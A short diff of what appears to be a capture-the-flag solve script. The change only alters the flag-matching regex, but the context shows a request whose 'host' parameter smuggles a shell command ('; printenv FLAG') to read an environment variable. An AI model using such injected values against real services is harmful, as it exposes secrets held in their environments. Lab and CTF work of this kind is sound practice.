@@ -30,7 +30,7 @@ def solve():
         params={"host": "127.0.0.1; printenv FLAG"},
         timeout=10,
     )
-    m = re.search(r"CTF\{[^}]*\}", r.text)
+    m = re.search(r"CTF4\{[^}]*\}", r.text)
     return m.group(0) if m else ""
 
 
